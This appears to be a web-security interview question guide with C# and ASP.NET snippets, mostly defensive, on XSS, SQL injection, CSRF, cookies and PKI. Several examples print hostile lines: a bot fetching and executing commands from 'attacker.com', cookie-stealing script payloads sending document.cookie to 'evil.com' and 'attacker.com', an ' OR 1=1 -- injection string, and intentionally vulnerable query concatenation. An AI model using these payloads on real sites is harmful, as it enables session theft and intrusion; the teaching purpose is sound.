# Entry

## Q1: What is a DDOS attack?

A Distributed Denial of Service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming it with a flood of internet traffic. This is typically achieved by using multiple compromised computers (often part of a botnet) to send an excessive number of requests or data packets to the target. The objective is to exhaust the target’s resources (like CPU, memory, or bandwidth), causing the site or service to become unavailable to legitimate users. DDoS attacks can be volumetric (overloading network bandwidth), protocol-based (exploiting server resources), or application-layer attacks (targeting particular web app functions). These attacks are a common threat to web security.

```csharp
// No relevant C# code for DDoS description. Here is a simulated example:
public void ProcessRequest(Request req)
{
    // A naive server may become unresponsive under DDoS as it doesn't throttle requests
    Handle(req);
}
```
---

## Q2: What is “Vulnerability”?

A vulnerability is a weakness or flaw in a system, application, or its implementation that can be exploited by an attacker to perform unauthorized actions. Vulnerabilities can arise from insecure code, poor system design, misconfigurations, or even inadequate security policies. They enable threats such as unauthorized access, data breaches, privilege escalation, or denial of service attacks. Identifying and patching vulnerabilities is crucial for maintaining application and infrastructure security. Common sources of vulnerabilities in .NET applications include unvalidated user input, improper error handling, and outdated libraries.

```csharp
// Vulnerability example: SQL Injection due to unsafe string concatenation
string query = "SELECT * FROM Users WHERE Name = '" + userInput + "'";
```
---

## Q3: What is SQL injection?

SQL Injection is a security vulnerability that allows attackers to interfere with the queries an application makes to its database. It occurs when user input is concatenated directly into SQL queries without proper validation or escaping. This enables attackers to execute arbitrary SQL code, potentially causing data theft, loss, or manipulation. SQL Injection can also be used to bypass authentication or escalate privileges. Preventing SQL injection involves using parameterized queries or stored procedures instead of building SQL commands from user input.

```csharp
// Vulnerable code
string query = "SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'";
// Secure code
using(var cmd = new SqlCommand("SELECT * FROM Users WHERE Username=@u AND Password=@p", conn))
{
    cmd.Parameters.AddWithValue("@u", username);
    cmd.Parameters.AddWithValue("@p", password);
}
```
---

## Q4: What is a botnet?

A botnet is a network of private computers infected with malicious software and controlled as a group without the owners’ knowledge. Each individual machine, known as a bot or zombie, can be remotely manipulated by an attacker (the botmaster) to perform coordinated malicious activities, such as launching DDoS attacks, spreading malware, sending spam, or stealing data. Botnets use command-and-control servers to issue instructions, and their distributed nature makes them formidable security threats.

```csharp
// No direct C# code, but simulating a botnet-controlled system:
// Bot polling C&C for commands
public void ConnectToC2()
{
    string command = DownloadString("http://attacker.com/command");
    Execute(command);
}
```
---

## Q5: What is the difference between Authentication vs Authorization?

Authentication is the process of verifying the identity of a user or system, usually via credentials like username and password. Authorization, on the other hand, determines what actions an authenticated user or system is allowed to perform (permissions). Authentication always happens before authorization. A valid login (authentication) does not, by itself, guarantee access to resources (authorization); access rights are checked after identity is established.

```csharp
// Authentication example
if(ValidateUser(username, password))
{
    // Authorization
    if(user.Role == "Admin")
    {
        GrantAccess();
    }
}
```
---

## Q6: What is Security Testing?

Security testing is a process to uncover vulnerabilities of an information system and ensure that data and resources are protected from possible intruders. It aims to identify potential security weaknesses, threats, and risks in software applications and network environments so that they can be mitigated. Types include vulnerability scanning, penetration testing, risk assessment, security audits, and ethical hacking. Security testing validates mechanisms around authentication, authorization, data integrity, confidentiality, and non-repudiation.

```csharp
// Simulated security check test
public void TestSQLInjection(string input)
{
    // Pass input like "' OR 1=1 --" and verify secure query handling
    // This should not bypass authentication
}
```
---

## Q7: List the various methodologies in Security testing?

Security testing methodologies include:
1. Vulnerability Scanning: Automated tools to find vulnerabilities.
2. Penetration Testing: Simulated attacks to discover weaknesses.
3. Risk Assessment: Identifying and prioritizing risks.
4. Security Auditing: Reviews of code and configurations.
5. Ethical Hacking: Authorized hacking to discover flaws.
6. Posture Assessment: Evaluating security policies and procedures.
7. Security Scanning: Checking for misconfigurations and security gaps.

These methodologies ensure comprehensive coverage of security threats in software and infra environments.

```csharp
// No direct code. Example usage in automated security scan:
public void RunSecurityScan()
{
    var scanner = new VulnerabilityScanner();
    var results = scanner.ScanTarget("https://myapp.com");
}
```
---

# Junior

## Q8: What is Content Security Policy?

Content Security Policy (CSP) is a web browser security standard that helps prevent attacks such as Cross Site Scripting (XSS) and data injection. It works by defining allowed sources for scripts, styles, images, and other resources in an HTTP header. CSP enables developers to specify which domains or sources are trusted, thereby limiting the ways in which attackers can inject malicious code. CSP policies can be enforced or used in report-only mode. Implementing CSP helps improve application security by reducing attack surfaces for client-side threats.

```csharp
// Example in ASP.NET Core middleware
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", "default-src 'self'");
    await next();
});
```
---

## Q9: What is Cross Site Scripting (XSS)?

Cross Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The injected scripts execute in the context of the victim’s browser and can steal cookies, session tokens, or manipulate the DOM. There are three primary types: Stored, Reflected, and DOM-based XSS. Preventing XSS involves sanitizing and encoding user inputs and outputs, setting appropriate HTTP security headers, and using CSP.

```csharp
// Example vulnerable code
string html = "<div>" + userInput + "</div>";
// Secure: HtmlEncode output
display.Text = HttpUtility.HtmlEncode(userInput);
```
---

## Q10: How can we Protect Web Applications From Forced Browsing?

Forced Browsing occurs when attackers gain access to resources by guessing or manipulating URLs. Protection measures include proper authentication and authorization checks for every resource, not relying solely on obscurity, and not exposing sensitive admin URLs. Implement role checks on all endpoints and directories, and use custom error pages to avoid leaking resource availability.

```csharp
public IActionResult AdminPanel()
{
    if(!User.IsInRole("Admin"))
        return Forbid();
    // Admin panel code
}
```
---

## Q11: Explain what threat arises from not flagging HTTP cookies with tokens as secure?

If HTTP cookies containing tokens (like session tokens) are not marked as "Secure," they can be transmitted over unencrypted HTTP connections, making them vulnerable to interception through packet sniffing or man-in-the-middle attacks. Attackers may steal these tokens and impersonate users. Cookies holding sensitive data must be set with the Secure flag, ensuring they are sent only over HTTPS connections.

```csharp
Response.Cookies.Append("AuthToken", token, new CookieOptions
{
    Secure = true, // Only send over HTTPS
    HttpOnly = true
});
```
---

## Q12: What is an SSL Certificate?

An SSL Certificate is a digital certificate that authenticates the identity of a website and enables encrypted communication using the HTTPS protocol. Issued by a Certificate Authority (CA), SSL certificates ensure data transmitted between the user's browser and web server is encrypted and secure from eavesdropping or tampering. SSL is vital for protecting sensitive information, building trust, and complying with security best practices.

```csharp
// ASP.NET Core enables SSL with UseHttpsRedirection
app.UseHttpsRedirection();
```
---

## Q13: How to mitigate the SQL Injection risks?

Mitigating SQL Injection involves:
- Always using parameterized queries or stored procedures.
- Avoiding dynamic SQL constructed with user input.
- Validating and sanitizing input.
- Using ORM frameworks that abstract SQL building.
- Limiting database privileges for application accounts.
- Regularly updating software and libraries.

These practices help ensure user input cannot alter SQL command structure, protecting the database.

```csharp
using(var cmd = new SqlCommand("SELECT * FROM Users WHERE Username=@u", conn))
{
    cmd.Parameters.AddWithValue("@u", username);
}
```
---

## Q14: What is Session Hijacking?

Session Hijacking is an attack where an attacker gains unauthorized access to a user's session by stealing the session token (often found in cookies). This enables the attacker to impersonate the user and perform actions on their behalf. It can happen through XSS, network eavesdropping, or physical access. Prevent session hijacking by using secure, HTTP-only cookies, enforcing HTTPS, regenerating session IDs after login, and monitoring session behaviors.

```csharp
Response.Cookies.Append("sessionId", sessionId, new CookieOptions
{
    Secure = true, // Ensures HTTPS only
    HttpOnly = true // Not accessible via JavaScript
});
```
---

## Q15: Mention what flaw arises from session tokens having poor randomness across a range of values?

If session tokens have poor randomness and are easy to guess, attackers can perform session prediction attacks. By generating or brute-forcing potential token values, they may gain unauthorized access to active sessions. This flaw undermines the security of session management. Secure session tokens should be unpredictable and generated using cryptographically secure random number generators.

```csharp
// Insecure random token
string sessionId = new Random().Next(0, 100000).ToString();
// Secure token
var rng = new RNGCryptoServiceProvider();
byte[] tokenData = new byte[32];
rng.GetBytes(tokenData);
string sessionId = Convert.ToBase64String(tokenData);
```
---

## Q16: What is DOM-based XSS?

DOM-based XSS is a subtype of Cross Site Scripting where the vulnerability exists in client-side scripts (JavaScript) that process user-supplied data and update the DOM without proper sanitization or encoding. The malicious payload never reaches the server; instead, it’s executed directly in the victim’s browser when the DOM is manipulated unsafely using data from URLs, hash fragments, or user input.

```csharp
// JavaScript in view (vulnerable)
/*
var search = location.hash.substr(1);
document.getElementById('result').innerHTML = search; // XSS if hash contains script
*/
// Use: textContent instead of innerHTML or sanitize input
```
---

## Q17: What is CORS and how to enable one?

CORS (Cross-Origin Resource Sharing) is a security feature implemented by browsers to restrict web pages from making requests to a different domain than the one that served the web page. A server can enable CORS by adding HTTP headers specifying which origins are allowed to access its resources. In ASP.NET Core, CORS can be enabled with middleware and policies.

```csharp
// In Startup.cs
services.AddCors(options =>
{
    options.AddPolicy("AllowSpecificOrigin", builder =>
        builder.WithOrigins("https://example.com")
            .AllowAnyHeader()
            .AllowAnyMethod()
    );
});

app.UseCors("AllowSpecificOrigin");
```
---

## Q18: What is Intrusion Detection System (IDS)?

An Intrusion Detection System (IDS) is a security solution that monitors network or system activities for malicious activities or policy violations. Upon detecting suspicious behavior, an IDS can alert administrators or trigger automated responses. IDS can be network-based (analyzing traffic) or host-based (monitoring software and system logs). They play a critical role in detecting ongoing attacks, unauthorized access, and helping contain incidents.

```csharp
// Simulated log analysis
public void AnalyzeLogsForIntrusion()
{
    if(log.Message.Contains("SQL Injection"))
    {
        AlertAdmin();
    }
}
```
---

## Q19: What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a vulnerability that enables attackers to inject client-side scripts into web pages, which are then executed by users' browsers. This can result in stolen cookies or credentials, session hijacking, and site defacement. XSS typically exploits lack of proper input/output encoding and is classified as Stored, Reflected, or DOM-based. Mitigation relies on proper input validation, output encoding, and security headers.

```csharp
// Output encoding in Razor
@Html.Encode(userInput)
```
---

## Q20: Why is the Root Certificate important?

A Root Certificate is a trust anchor for the public key infrastructure; it is self-signed and used to sign intermediate certificates. Browsers and operating systems trust certificates (used for SSL/TLS) if their chain links up to a trusted root certificate. Compromising a root certificate undermines entire trust models, allowing attackers to impersonate any site in the chain.

```csharp
// No code, but in .NET you can view/root store
var store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
store.Open(OpenFlags.ReadOnly);
```
---

## Q21: What is impersonation?

Impersonation is a security mechanism where a process or user temporarily assumes the identity or permissions of another user. In .NET and web applications, impersonation can be used to allow code to perform actions on behalf of a user, often for accessing resources that require specific permissions.

```csharp
WindowsIdentity.RunImpersonated(userIdentity.AccessToken, () =>
{
    // Execute code as the impersonated user
});
```
---

## Q22: How can I prevent XSS?

Cross Site Scripting (XSS) can be prevented primarily by ensuring user inputs are never trusted and are always properly sanitized and encoded before they are rendered in the browser. Use server-side frameworks and libraries that auto-encode HTML output, such as Razor in ASP.NET. All inputs from users should be validated for expected values, length, and type. Disallow or strictly check for script tags and event handlers in user data. Use Content Security Policy (CSP) headers to instruct browsers to block inline scripts and unauthorized sources. Always output encode (or HTML encode) data when injecting it into web pages. For dynamic JavaScript, use JS encoding, and for URLs, use URL encoding. Keep third-party libraries and frameworks up to date, as older versions may contain vulnerabilities.

```csharp
@Html.Encode(Model.UserComment)

// OR with Razor's automatic encoding
@Model.UserComment
```

---

## Q23: Apart from mailing links of error pages, are there other methods of exploiting XSS?

Yes, XSS vulnerabilities can be exploited in several ways besides sending error page links. An attacker can inject malicious scripts in comment fields, profile information, or any input that is then displayed to users. They could use XSS to hijack cookies, steal session tokens, perform phishing, log keystrokes, manipulate page content, or redirect users without their knowledge. XSS may also be used to attack internal users of an application (such as admins, via stored XSS), escalate privileges, or propagate worms. Attackers may use social engineering, placing malicious scripts in forums, chats, or other interactive user content.

```csharp
// Example - Malicious script in a comment field that steals cookies
<input type="text" name="comment" value="" />
// Attacker posts: <script>fetch('http://evil.com?c='+document.cookie)</script>
```

---

## Q24: Can XSS be prevented without modifying the source code?

Yes, it is possible in some cases to reduce the risk of XSS without changing the application code, such as by using Web Application Firewalls (WAFs) to filter and block suspicious input patterns. Another method is to set strong HTTP response headers (e.g., Content-Security-Policy, X-XSS-Protection) at the server or proxy level. These actions can restrict what scripts are allowed to execute, limit sources of content, or block reflected XSS. However, these are mitigations, not true fixes, and do not address the root cause. Complete prevention should ultimately involve fixes to the source code to ensure proper encoding and validation.

```csharp
// Setting HTTP headers in ASP.NET Core middleware
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", "default-src 'self'");
    await next();
});
```

---

## Q25: List the attributes of Security Testing

Security testing has several key attributes, including confidentiality (ensuring data is accessible only to authorized users), integrity (ensuring data is accurate and not tampered with), availability (ensuring data/services are accessible when needed), authentication (verifying user identity), authorization (granting or denying specific permissions), non-repudiation (ensuring actions can't be denied), and resilience (system's ability to handle security breaches). Security testing looks for vulnerabilities such as XSS, SQL Injection, CSRF, and improper access controls.

```csharp
// Example of attribute for role-based authorization
[Authorize(Roles = "Admin")]
public IActionResult SecureData()
{
    // Only accessible to Admins
}
```

---

## Q26: How to mitigate the risk of Sensitive Data Exposure?

Mitigate risk of sensitive data exposure by encrypting data at rest and in transit using strong algorithms (such as AES for storage, TLS for transmission). Never store sensitive information like passwords, keys, or credit card numbers in plain text. Always use secure key management practices. Avoid unnecessary data exposure by limiting what data is stored, used, and displayed. Mask sensitive data in UI and logs. Enforce secure communication channels (HTTPS only), set Security/HttpOnly cookie flags, and implement access controls. Regularly test for data leaks and follow compliance standards like GDPR or PCI DSS.

```csharp
// Using Data Protection API to encrypt sensitive data
var protector = _dataProtectionProvider.CreateProtector("MyAppPurpose");
string protectedData = protector.Protect("SensitiveInformation");
string unprotectedData = protector.Unprotect(protectedData);
```
---

# Mid

## Q27: Name the elements of PKI

Public Key Infrastructure (PKI) elements consist of Certificate Authorities (CAs), Registration Authorities (RAs), digital certificates, certificate revocation lists (CRLs), public/private key pairs, and end-user entities or devices. The CA issues and manages certificates, verifying identities. The RA assists the CA by validating requests. Digital certificates bind public keys to identities. The CRL lists revoked or invalid certificates. PKI manages secure key distribution and ensures confidentiality, authentication, integrity, and non-repudiation in digital communications.

```csharp
// Loading a certificate in .NET
X509Certificate2 certificate = new X509Certificate2("path/to/cert.pfx", "password");
```

---

## Q28: What is the difference between IDS and firewalls?

An Intrusion Detection System (IDS) monitors network/system traffic for suspicious activity and potential threats, sending alerts when detected, but it does not block traffic by itself. Firewalls, on the other hand, actively filter incoming and outgoing traffic based on predefined security rules, blocking or allowing traffic. IDS is reactive and monitoring-focused, while firewalls are proactive and preventive. Some systems combine both (IPS/IDS and firewalls) for improved security coverage.

```csharp
// Pseudocode for firewall (permit/deny logic)
if (request.SourceIP == allowedIP)
{
    AllowRequest();
}
else
{
    BlockRequest();
}
```

---

## Q29: List Top 10 OWASP Vulnerabilities

OWASP Top 10 vulnerabilities (2021) are:
1. Broken Access Control
2. Cryptographic Failures
3. Injection (e.g., SQL, NoSQL, Command)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

```csharp
// Example: Preventing SQL Injection (Item 3)
using (SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE UserId = @id"))
{
    cmd.Parameters.AddWithValue("@id", userId);
}
```

---

## Q30: Mention what threat can be avoided by having unique usernames produced with a high degree of entropy?

Account enumeration and brute-force attacks can be avoided with unique, high-entropy usernames. Predictable usernames make it easier for attackers to guess valid accounts and perform targeted attacks (e.g., brute-force password attempts or phishing). By increasing username entropy (randomness), attackers can't easily enumerate or guess usernames, enhancing overall authentication security.

```csharp
// Generate random username (high entropy)
string username = Guid.NewGuid().ToString();
```

---

## Q31: What information can an attacker steal using XSS?

With XSS, attackers can steal session cookies, tokens, user credentials, and any sensitive data accessible in the DOM or stored in the browser (e.g., local storage). They can also capture keystrokes (keylogging), read forms, perform actions as the user (CSRF), redirect to phishing sites, and access browser history. In privileged contexts, attackers could escalate to broader system access or persistent threats.

```csharp
// Script to steal cookies (malicious, example only)
<script>
    fetch('https://attacker.com?c=' + document.cookie);
</script>
```

---

## Q32: What is Cross-Site Request Forgery?

Cross-Site Request Forgery (CSRF) tricks a user’s browser into making unwanted requests to another site where the user is authenticated, without their consent. Attackers exploit the user's session (e.g., performing actions as the user) by embedding requests in images, links, or forms. Mitigation involves using anti-CSRF tokens, checking referer/origin headers, and requiring re-authentication for critical actions.

```csharp
// Add anti-forgery token in ASP.NET
@Html.AntiForgeryToken()
[ValidateAntiForgeryToken]
public ActionResult UpdateSettings(UserModel user)
{
    // Only proceeds if token is valid
}
```

---

## Q33: What is PKI?

Public Key Infrastructure (PKI) is a framework of hardware, software, policies, and standards that manage digital certificates and public-key encryption. PKI ensures secure electronic transfer of information through identity verification, encryption, digital signing, and certificate management. CAs issue certificates, binding public keys to subjects, enabling trust. PKI underpins HTTPS, encrypted emails, code signing, etc.

```csharp
// Use certificate to sign data
byte[] signed = certificate.GetRSAPrivateKey().SignData(data, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
```

---

## Q34: What is Cross-site request forgery and how to mitigate it?

Cross-site request forgery (CSRF) causes users to execute unwanted actions on web apps where they’re authenticated. Attackers may trick users into making unintended transactions by submitting requests on their behalf. Mitigate CSRF by using anti-CSRF tokens in all state-changing forms, validating tokens server-side, checking referer/origin headers, and enforcing SameSite cookie attribute. Requiring multi-factor or re-authentication for sensitive activities also helps.

```csharp
// Enforcing SameSite cookie setting
var cookieOptions = new CookieOptions { SameSite = SameSiteMode.Strict, Secure = true };
Response.Cookies.Append("Auth", "value", cookieOptions);
```

---

## Q35: Could you explain the difference between penetration testing and other forms of security testing?

Penetration testing simulates attacks by ethical hackers to find and exploit vulnerabilities, mimicking real attacker behavior, and demonstrating the end-to-end impact. Other security testing (e.g., vulnerability scanning, code review, configuration analysis) is more focused on identifying issues or vulnerabilities without exploitation. Pen testing verifies actual risks and exploits, while security testing identifies potential problems and helps maintain secure coding and configuration practices.

```csharp
// Vulnerability scanning (automated tools)
StartVulnerabilityScanner(targetAppUrl);
```

---

## Q36: What Is Failure to Restrict URL Access?

Failure to restrict URL access occurs when users can access resources by changing URLs (e.g., /admin) regardless of permissions. This is often due to missing access controls on sensitive endpoints. Mitigation requires strict server-side authorization checks to verify each user’s permissions before serving content.

```csharp
[Authorize(Roles = "Admin")]
public IActionResult AdminDashboard()
{
    // Only accessible to Admins
}
```

---

## Q37: What is the difference between encryption, encoding, and hashing?

Encryption secures data using a reversible algorithm and key, allowing only authorized users to decrypt. Encoding transforms data into a different format for safe transmission/storage but is easily reversible and not for secrecy. Hashing converts data to a fixed-size value, is one-way (irreversible), and used for integrity checks (e.g., passwords).

```csharp
// Encryption
string encrypted = Encrypt(text, key);
// Encoding
string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
// Hashing
string hash = Convert.ToBase64String(SHA256.HashData(Encoding.UTF8.GetBytes(text)));
```

---

## Q38: How to mitigate the risk of Weak authentication and session management?

Mitigate weak authentication/session issues by enforcing strong password policies, multi-factor authentication, and secure storage of credentials (hash+salt). Invalidate sessions on logout, implement session timeouts, and use secure cookie flags (HttpOnly, Secure, SameSite). Regenerate session IDs on login and privilege change, and monitor unusual activity. Avoid storing session identifiers in URLs.

```csharp
// Setting secure session cookie
var options = new CookieOptions { HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict };
Response.Cookies.Append("SessionId", sessionId, options);
```

---

## Q39: What is HTTP Public Key Pinning and when to use it?

HTTP Public Key Pinning (HPKP) is a security feature that tells browsers which cryptographic public keys are valid for a website, preventing attackers from using fraudulent certificates issued by compromised or malicious CAs. HPKP is set using a response header with hashes of allowed keys. Use HPKP if you have control over certificate management and need extra protection against CA compromise, but it is risky (sites can lock themselves out) and is deprecated by major browsers.

```csharp
// Sending HPKP header (not recommended for new use)
context.Response.Headers.Add("Public-Key-Pins", "pin-sha256=\"base64==\"; max-age=5184000;");
```

---

## Q40: Mention what happens when an application takes user inserted data and sends it to a web browser without proper validation and escaping?

When an application sends user data to a browser without proper validation and escaping, it exposes itself to XSS attacks. Malicious users can inject scripts and HTML that execute in other users’ browsers, leading to data theft, session hijacking, phishing, defacement, or full application compromise. Always validate and encode untrusted data before output.

```csharp
// BAD: untrusted user input directly in response
Response.Write(userInput);
// GOOD: encode before output
Response.Write(HttpUtility.HtmlEncode(userInput));
```
---

# Senior

## Q41: What is a Honeypot?
A honeypot is a security mechanism set up to attract attackers by simulating vulnerable systems or services. Its purpose is to lure in attackers, detect unauthorized access attempts, and study attack patterns or techniques. Honeypots do not serve production traffic and are often isolated from the main network to prevent compromise. They help security teams monitor malicious activity in a controlled environment and gather intelligence on new threats or vulnerabilities. Honeypots can be categorized as low-interaction (simulate some services) or high-interaction (fully functional OS/services). Properly configured, they can help organizations improve intrusion detection and identify gaps in defenses. However, deploying honeypots requires careful planning to avoid turning them into a launchpad for attacks against others.

```csharp
// Minimal example: Simulating a honeypot listener in C#.
class Honeypot
{
    public void Start()
    {
        var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, 1337);
        listener.Start();
        while (true)
        {
            var client = listener.AcceptTcpClient();
            // Log the event, do not provide real service
            System.Console.WriteLine("Connection attempt detected: " + client.Client.RemoteEndPoint);
            client.Close();
        }
    }
}
```
---

## Q42: What is ClickJacking?
Clickjacking is a web-based attack in which a malicious website tricks users into clicking on something different from what they perceive, by loading another website in a transparent or disguised frame. Attackers use this to hijack user clicks, leading to unintended actions such as changing settings or authorizing transactions. It is often implemented with HTML iframes or by overlaying transparent buttons. Clickjacking exploits the user's trust in the visible page content. The primary defense is to prevent your site from being framed, using HTTP headers like `X-Frame-Options` or Content Security Policy (CSP) with the `frame-ancestors` directive, ensuring browsers block your site from loading in a frame or iframe.

```csharp
// Setting response header in ASP.NET to prevent framing
protected void Application_BeginRequest()
{
    HttpContext.Current.Response.AddHeader("X-Frame-Options", "DENY");
}
```
---

## Q43: Is it possible to decrypt MD5 hashes? Explain.
MD5 is a cryptographic hash function, meaning it transforms data into a fixed-size hash value (digest) and is designed to be one-way and non-reversible. In theory, MD5 hashes cannot be decrypted to retrieve the original input because hashing does not retain sufficient information. However, MD5 is vulnerable to brute-force and collision attacks due to its speed and weaknesses, so attackers can use precomputed tables (rainbow tables) or dictionaries to find a matching input for a hash. This is not decryption but rather guessing. If two different inputs produce the same hash (collision), it's a flaw in the hash algorithm, not a successful decryption.

```csharp
// Generating an MD5 hash in C#
string password = "MyPassword";
using (var md5 = System.Security.Cryptography.MD5.Create())
{
    byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);
    byte[] hashBytes = md5.ComputeHash(inputBytes);
    string hash = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
    Console.WriteLine(hash); // Not reversible
}
```
---

## Q44: If you can decode JWT, how are they secure?
JWTs (JSON Web Tokens) are encoded—often using Base64—but not encrypted by default. Anyone with the token can decode and read the payload, but the payload's integrity is enforced by a digital signature. A JWT is secure because the recipient can verify that the contents have not been altered using the signature and the shared secret (in HMAC) or public key (in RSA/ECDSA). Confidential information must not be stored in non-encrypted JWTs since decoding is trivial. For confidentiality, encrypt the JWT (JWE standard). Security comes from the fact that attackers cannot forge or tamper with the payload without invalidating the signature.

```csharp
// JWT example using System.IdentityModel.Tokens.Jwt (NuGet package)
string token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
JwtSecurityToken jwt = new JwtSecurityTokenHandler().ReadJwtToken(token);
var payload = jwt.Payload; // Decoded, but verify with signature
```
---

## Q45: How to ensure that a file can only be decrypted after a specific date?
To ensure a file is only decrypted after a certain date, encrypt the file and store either the decryption key, or the logic to decrypt, behind a time-based restriction. Typically, access-control logic is enforced by the application, not the encryption algorithm itself. A common approach is to use secure time servers in combination with hardware security modules (HSMs) or key escrow services that release the key only after the date. Another option is to embed an expiration timestamp in the encrypted data and have the decryption software refuse to decrypt before that date.

```csharp
// Pseudocode for time-check before decryption
DateTime unlockDate = new DateTime(2024, 07, 01);
if (DateTime.UtcNow >= unlockDate)
{
    // Decrypt file
}
else
{
    throw new UnauthorizedAccessException("Cannot decrypt before " + unlockDate);
}
```
---

## Q46: What's the difference between OpenID and OAuth?
OpenID and OAuth are both protocols for delegated identity and authorization, but they serve different purposes. OpenID (primarily OpenID Connect) is used for authentication—confirming the user's identity using a third-party provider (like Google or Microsoft). OAuth, especially OAuth 2.0, is used for authorization—granting applications access to user resources (like email or profile) without sharing passwords. OpenID Connect sits on top of OAuth 2.0 and adds an identity layer, providing information about the user. OAuth alone does not define how user identity is conveyed; it's about scoped access tokens.

```csharp
// Example: Configuring authentication (OpenID Connect) in ASP.NET Core
services.AddAuthentication(options =>
{
    options.DefaultScheme = "Cookies";
    options.DefaultChallengeScheme = "oidc";
})
.AddCookie("Cookies")
.AddOpenIdConnect("oidc", options =>
{
    options.Authority = "https://provider.com";
    options.ClientId = "client_id";
    options.ClientSecret = "secret";
});
```
---

## Q47: How does SSL/TLS work?
SSL/TLS is a protocol that provides encrypted and authenticated communication over the internet. When a client connects to a server, they perform a handshake: they agree on a cipher suite, the server proves its identity with a digital certificate, and session keys are exchanged (securely, usually with Diffie-Hellman or RSA). After this, all data is encrypted with symmetric keys, ensuring confidentiality and integrity. The handshake prevents eavesdropping and tampering by attackers. TLS is the successor to SSL, with improved security and deprecated protocols.

```csharp
// Enforcing HTTPS in ASP.NET Core
public void Configure(IApplicationBuilder app)
{
    app.UseHttpsRedirection();
}
```
---

## Q48: Explain briefly CORS (Cross-Origin Resource Sharing)?
CORS is a browser security mechanism allowing controlled access to resources located outside of the current domain. By default, browsers restrict AJAX requests to the same origin. CORS lets servers specify allowed origins by sending HTTP headers (`Access-Control-Allow-Origin`) in responses. This enables APIs to be safely accessed from web pages on different domains while preventing cross-site attacks. CORS policies can control allowed methods, headers, and credentials to fine-tune security.

```csharp
// Enabling CORS in ASP.NET Core
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowExample", builder =>
        {
            builder.WithOrigins("https://example.com")
                   .AllowAnyMethod()
                   .AllowAnyHeader();
        });
    });
}
```
---

## Q49: What is a Bug Bounty?
A bug bounty is a program offered by organizations that rewards individuals for finding and responsibly reporting security vulnerabilities or bugs in their systems and applications. It encourages independent security researchers (white-hat hackers) to test the organization's defenses legally. Payouts vary based on the severity and impact of the vulnerabilities discovered. Bug bounties help companies uncover and fix security issues before malicious actors exploit them. Successful bug bounty programs define clear rules, targets, and reporting channels.

```csharp
// No code sample possible; bug bounties are a process.
```
---

## Q50: What is Stored XSS?
Stored XSS (Cross-Site Scripting) is a type of vulnerability where malicious scripts are injected and saved (persisted) in a database or storage on the server. When other users load the affected page, the script is delivered and executed within their browsers as part of the page content. This makes stored XSS particularly dangerous, since it can impact many users without them interacting with the attacker directly. Payloads are usually injected into form fields, comments, or profiles where data is rendered unescaped. Preventing stored XSS involves validating and encoding user input before displaying it.

```csharp
// Example: Rendering unescaped user input (vulnerable)
string userComment = db.GetComment();
Response.Write(userComment); // BAD: could execute script

// Safe rendering
Response.Write(HttpUtility.HtmlEncode(userComment));
```
---

## Q51: What is Reflected XSS?
Reflected XSS occurs when user-supplied data in a request (such as query parameters or form inputs) is immediately included in a web page's response without proper validation or escaping. The attacker delivers a malicious link to a victim, and when the victim clicks it, the attacker's code is executed in the victim's browser within the context of the trusted site. Unlike stored XSS, the payload isn't persisted. Preventing reflected XSS involves validating and encoding all user inputs in HTTP responses.

```csharp
// Vulnerable code
string name = Request.QueryString["name"];
Response.Write(name); // BAD: XSS risk

// Prevented (encode output)
Response.Write(HttpUtility.HtmlEncode(name));
```
---

## Q52: What are X-Frame-Options?
`X-Frame-Options` is an HTTP response header that helps prevent clickjacking by controlling whether a browser should allow a page to be displayed in a `frame`, `iframe`, or `object` tag. Valid values are `DENY` (never allow framing), `SAMEORIGIN` (allow only from same origin), and `ALLOW-FROM uri` (allow only from specified origin, though support for this value is inconsistent). Modern best practice is to use both `X-Frame-Options` and Content Security Policy to restrict framing.

```csharp
// In ASP.NET, set X-Frame-Options
protected void Application_BeginRequest()
{
    HttpContext.Current.Response.AddHeader("X-Frame-Options", "DENY");
}
```
---

## Q53: What is Cross Site Tracing (XST)? How can it be prevented?
Cross Site Tracing (XST) is an attack that leverages the HTTP TRACE method, which echoes user input in responses, potentially exposing sensitive information like cookies or authentication headers. When combined with XSS or other vulnerabilities, an attacker can steal session data or credentials. XST is prevented by disabling the TRACE method on web servers, as it is rarely needed for legitimate purposes.

```csharp
// In web.config (IIS): disable TRACE verb
<system.webServer>
    <security>
        <requestFiltering>
            <verbs>
                <add verb="TRACE" allowed="false"/>
            </verbs>
        </requestFiltering>
    </security>
</system.webServer>
```
---

## Q54: How to Prevent Breaches Due to Failure to Restrict URL Access?
Preventing breaches due to failure to restrict URL access requires enforcing proper server-side authorization checks for every sensitive resource or endpoint, not just relying on client-side controls or hidden links. Ensure that authentication and authorization logic is implemented at the controller or middleware level. Test all URLs, especially those that are not visible in navigation, to confirm users cannot access resources beyond their privileges. Use frameworks or middleware that allow declarative security (e.g. `[Authorize]` attributes in ASP.NET).

```csharp
// ASP.NET Core: Restricting access
[Authorize(Roles = "Admin")]
public IActionResult AdminOnly()
{
    return View();
}
```
---

## Q55: What is HSTS?
HTTP Strict Transport Security (HSTS) is a web security policy mechanism that helps protect websites against man-in-the-middle attacks such as protocol downgrade attacks and cookie hijacking. When enabled by the server via the `Strict-Transport-Security` header, browsers are instructed to only communicate with the server over HTTPS for a specified period. HSTS can also mark the domain as HTTPS-only in browser caches, even if users manually enter `http://`.

```csharp
// ASP.NET Core: Add HSTS header
public void Configure(IApplicationBuilder app)
{
    app.UseHsts(); // Uses default policy
}
```
---

## Q56: What are the types of XSS?
